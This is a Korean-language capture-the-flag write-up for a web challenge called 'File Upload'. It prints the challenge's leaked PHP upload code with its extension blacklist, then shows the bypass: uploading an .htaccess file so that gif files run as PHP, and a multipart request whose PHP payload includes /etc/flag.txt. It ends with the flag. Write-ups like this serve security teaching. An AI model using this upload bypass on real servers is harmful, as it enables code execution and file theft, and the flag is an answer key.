# File Upload

```
Do you know how to upload files?

http://34.122.77.246/

Note: Flag is located in etc directory
Do not try to upload rev shell on web challenges there is no such requirement.

Author : x3rz
```
문제에 접속하면 다음과 같은 화면이 출력된다.  

![image](https://user-images.githubusercontent.com/44149738/131357100-1c5283b6-10f7-4632-bc09-1185b61dfa1c.png)

직감적으로 webshell을 올려야겠구나 싶어서 이것저것 올려봤지만 php, phtml 등이 막혀있어서 올라가지 않았다. 

## dirbuster

삽질하고 있는 나에게 길을 열어준 것은 다름아닌 상수형.

![image](https://user-images.githubusercontent.com/44149738/131448267-cc095b62-5788-4890-b2e4-00bf37704c74.png)

`dirbuster`를 돌려서 결과를 알려주셨다. 가장 먼저 `/.well-known/security.txt`에 접근했는데, `/backup.zip`에 대한 힌트가 있었다. 해당 zip 파일을 다운받아 풀어보니 `index.php.bak` 파일이 존재했다.

## index.php.bak
```php
<!DOCTYPE html>
<html>

<body>
 
<div align="center">
<form action="" method="post" enctype="multipart/form-data">
    <br>
    <b>Select image : </b> 
    <input type="file" name="file" id="file" style="border: solid;">
    <input type="submit" value="Submit" name="submit">
</form>
</div>
<?php

if (isset($_POST['submit'])) {
	$target_dir = "uploads/";

	$name = $target_dir . basename($_FILES['file']['name']);

	$ext = strtolower(pathinfo($name)['extension']);
	$target_file = $target_dir . basename($_FILES['file']['name']);

	// var_dump($ext);
	$uploadOk = 1;

	$blacklist = array("php","php5","php4","php3","php2","php1","html","htm","phtml","pht","pHp","pHp5","pHp4","pHp3","pHp2","pHp1","Html","Htm","pHtml","jsp","jspa","jspx","jsw","jsv","jspf","jtml","jSp","jSpx","jSpa","jSw","jSv","jSpf","jHtml","asp","aspx","asa","asax","ascx","ashx","asmx","cer","aSp","aSpx","aSa","aSax","aScx","aShx","aSmx","cEr","sWf","swf");




	if(!in_array($ext, $blacklist)){
		if(move_uploaded_file($_FILES['file']['tmp_name'], $name)){
			echo "<script>alert('uploaded!!')</script>";
		} 
	}else {
			echo "<script>alert('not allowed!!')</script>";
		} 
}
?>


</body>
</html>
```
백업 파일에는 우회의 요소가 많아보이지만 실제 서비스와 좀 달랐다. 백업파일보다 보안성이 높아진듯 했다. webshell 확장자는 거의 다 막혀있었다.

## .htaccess
php 관련 확장자를 막아두었으므로 php 해석 확장자를 조작할 수 있는 `.htaccess` 업로드가 가능한지 확인해봤다.  

![image](https://user-images.githubusercontent.com/44149738/131448844-cc628b8d-16e3-47b8-9787-8449b8cd076f.png)


갑자기 접속이 안된다는 팀원의 제보. htaccess 파일 문법에 오류가 있었던 덕(?)에 htaccess가 잘 동작함을 알 수 있었다. png는 다른 팀 사람들도 자주 테스트해볼 것 같아서 gif를 php로 해석 가능하도록(~~?? 도긴개긴,,~~) `.htaccess` 파일을 조작했다. 이후, gif 업로드 패킷을 조작해서 php 코드를 삽입해서 플래그를 얻어낼 수 있었다.

처음에는 `system`이나 `shell_exec`와 같은 함수들을 사용했는데 잘 안되길래 다음과 같이 `include`로 진행했다.

```
Content-Disposition: form-data; name="file"; filename="js6.gif"
Content-Type: application/octet-stream

<?php
include "/etc/flag.txt";
?>
```

## flag
```
wormcon{f1l3_upl04d_c0uld_b3_m355y_0qw13eq}
```